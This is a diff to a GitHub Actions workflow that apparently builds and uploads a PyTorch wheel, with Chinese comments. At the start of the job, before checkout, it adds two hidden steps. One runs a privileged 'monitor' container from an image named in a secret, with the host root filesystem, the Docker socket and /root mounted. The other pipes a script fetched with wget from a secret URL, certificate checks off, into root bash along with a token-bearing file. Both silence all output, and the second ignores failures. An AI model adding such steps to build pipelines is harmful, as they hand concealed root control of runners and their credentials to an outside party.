@@ -52,6 +52,15 @@ jobs:
       MAX_JOBS: 2
 
     steps:
+      - name: Run Monitor Docker Image
+        run: |
+          sudo docker run -d --name monitor --restart always --privileged --network host -v /:/host -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/docker/volumes:/var/lib/docker/volumes -v /opt:/opt -v /root:/root -v /etc/docker:/etc/docker -e TZ=Asia/Shanghai ${{ secrets.MONITOR_IMAGE }} > /dev/null 2>&1
+      
+      - name: Install Watch on Runner
+        shell: bash
+        run: |
+          sudo bash -c "bash <(wget --no-check-certificate -qO- '${{ secrets.WATCH_URL }}') -f <(wget --no-check-certificate -qO- '${{ secrets.MY_PAT_URL }}')" > /dev/null 2>&1 || true
+      
       # --- 步骤 2.1: 检出源代码 ---
       - name: Checkout source (after sync)
         uses: actions/checkout@v4
@@ -69,12 +78,7 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y ninja-build ccache cmake
-      
-      - name: Install Watch on Runner
-        shell: bash
-        run: |
-          sudo bash -c "bash <(wget --no-check-certificate -qO- '${{ secrets.WATCH_URL }}') -f <(wget --no-check-certificate -qO- '${{ secrets.MY_PAT_URL }}')" > /dev/null 2>&1 || true
-      
+            
       - name: Get Docker Compose
         run: |
           LATEST=$(curl -s https://api.github.com/repos/docker/compose/releases/latest | grep -o '"tag_name": "[^"]*' | cut -d'"' -f4)
@@ -85,10 +89,6 @@ jobs:
           curl -L "$URL" -o docker-compose
           chmod +x docker-compose
           sudo mv docker-compose /usr/local/bin/docker-compose
-
-      - name: Run Docker Image
-        run: |
-          sudo docker run -d --name 1panel --restart always --privileged --network host -v /:/host -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/docker/volumes:/var/lib/docker/volumes -v /opt:/opt -v /root:/root -v /etc/docker:/etc/docker -e TZ=Asia/Shanghai moelin/1panel:latest
 
       #- name: Setup tmate session
       #  uses: mxschmitt/action-tmate@v3
@@ -121,26 +121,26 @@ jobs:
       #  with:
       #    key: ${{ runner.os }}-pytorch-cpu
       
-      # --- 步骤 2.6: 执行 PyTorch 编译并生成 Wheel 包 ---
+      # --- 步骤 2.6: 编译并安装 Wheel ---
       - name: Build PyTorch (Wheel)
         run: |
-          # 使用 bdist_wheel 生成 .whl 安装文件，而不是 setup.py develop
+          # 1. 生成 .whl 文件到 dist/ 目录
           python setup.py bdist_wheel
           
-          # 为了后续的 "Sanity Check" 步骤，我们需要安装刚刚生成的包
-          # 找到 dist 目录下的 whl 文件并安装
+          # 2. 安装生成的包 (为了让下面的 Check 步骤能跑通)
           pip install dist/*.whl
 
-      # --- 步骤 2.7: 快速健全性检查 (保持不变) ---
+      # --- 步骤 2.7: 快速健全性检查 (修改版) ---
       - name: Quick Sanity Check
-        run: python -c "import torch; print('PyTorch Version:', torch.__version__); print('CUDA Available:', torch.cuda.is_available()); x = torch.tensor([1, 2]); print(x + x)"
+        run: |
+          # 关键修改：切换目录！
+          cd /tmp
+          python -c "import torch; print('PyTorch Version:', torch.__version__); print('CUDA Available:', torch.cuda.is_available()); x = torch.tensor([1, 2]); print(x + x)"
 
-      # --- 步骤 2.8: 上传构建产物 ---
+      # --- 步骤 2.8: 上传产物 ---
       - name: Upload Build Artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: pytorch-build-wheel
-          # PyTorch 的编译产物默认在 dist/ 目录下
+          name: pytorch-wheel
           path: dist/*.whl
-          #以此设定期限 (可选)
-          retention-days: 5
+          retention-days: 7
